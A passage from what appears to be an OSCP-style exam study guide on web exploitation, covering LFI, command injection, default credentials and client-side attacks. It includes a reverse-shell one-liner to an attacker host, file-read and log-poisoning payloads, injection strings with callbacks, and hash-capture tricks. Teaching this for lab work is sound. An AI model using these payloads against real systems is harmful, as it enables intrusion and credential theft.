curl "http://$IP/uploads/shell.php" --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'"

docs.title: 3.8 LFI / path traversal
docs.text:
Situation: ?page=about.php, ?file=report.pdf, ?lang=en.

?page=../../../../etc/passwd
?page=....//....//....//etc/passwd                     (filter strips ../ once)
?page=php://filter/convert.base64-encode/resource=index.php   (read PHP source)
?page=C:\Windows\System32\drivers\etc\hosts            (Windows)

Fuzz it: ffuf -u "http://$IP/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs <size>

What to read: /etc/passwd (users with shells), app config files (DB creds), /home/<user>/.ssh/id_rsa, C:\inetpub\wwwroot\web.config.

LFI → RCE options: include an uploaded file; log poisoning (send <?php system($_GET['c']); ?> as the User-Agent, then include /var/log/apache2/access.log&c=id); data:// / php://input wrappers if allow_url_include is on; RFI (?page=http://$KALI/shell.php) if remote includes work. On Windows, an LFI to a UNC path (\\$KALI\share\x) can leak a NetNTLMv2 hash to your SMB server.

docs.title: 3.9 Command injection
docs.text:
Situation: A "ping", "nslookup", "convert" or "backup" feature that takes your input.

127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
$(id)    `id`
127.0.0.1%0aid             (newline)

Blind? Use timing (; sleep 5) or an out-of-band callback (; curl http://$KALI/x, watch python3 -m http.server).

docs.title: 3.10 Login pages, default credentials and brute force
docs.text:
1. Product defaults (admin:admin, tomcat:s3cret, admin:password), the product's docs, /usr/share/seclists/Passwords/Default-Credentials/.
  2. Username = password; names found on the site as usernames.
  3. Only then a targeted brute force with hydra → Password attacks › hydra.

Logged in? Look for the feature that runs code: WordPress theme / plugin editor, Tomcat manager WAR deploy, Jenkins script console, CMS template editor, "import" functions.

docs.title: 3.11 Client-side attacks
docs.text:
If a box simulates a user who opens files (a mail server, a "send us your CV" upload, a writable share that someone browses):

  • Plant a file that makes Windows reach out to your SMB server (a .url / .lnk / .library-ms with an icon or target path \\$KALI\share) and capture NetNTLMv2 with impacket-smbserver.
  • Or deliver a payload (a shortcut that runs a PowerShell download cradle, a macro document) when the scenario clearly expects it.

Exam rule — no spoofing

Capturing hashes by poisoning LLMNR / NBT-NS / mDNS with Responder, or DHCPv6 with mitm6, is spoofing and banned. Making the target connect to you is fine → AD › Coercion.

Defender view of these payloads: Red Team: Initial Access · Phishing delivery · LNK & jump lists.

docs.title: 4. Common mistakes
docs.text:
• One wordlist, one extension. A .php app hides config.php.bak; an IIS app hides .aspx. Match extensions to the stack.
  • Not fuzzing inside 403 directories or new vhosts.
  • Running a public exploit unread — then not knowing whether it failed or the box is not vulnerable.
  • Keeping the web shell. You need an interactive reverse shell for the flag screenshot (flag rules).
  • Assuming a filter is a dead end. Upload / LFI filters on OSCP are usually naive; try the variations systematically.
  • Brute forcing blind. Hydra with rockyou.txt and no confirmed username wastes an hour.

docs.title: 5. Exam tips
docs.text:
• Proxy everything through Burp from the start — the request that worked is your report evidence.
  • When an exploit needs a reverse shell, use port 443 or 80 for LPORT; egress filtering is common.
  • Write the vulnerable URL, parameter and payload in your notes the moment it works.
  • Stuck for 45 minutes? Go back to Recon — there is usually a port or path you skimmed.
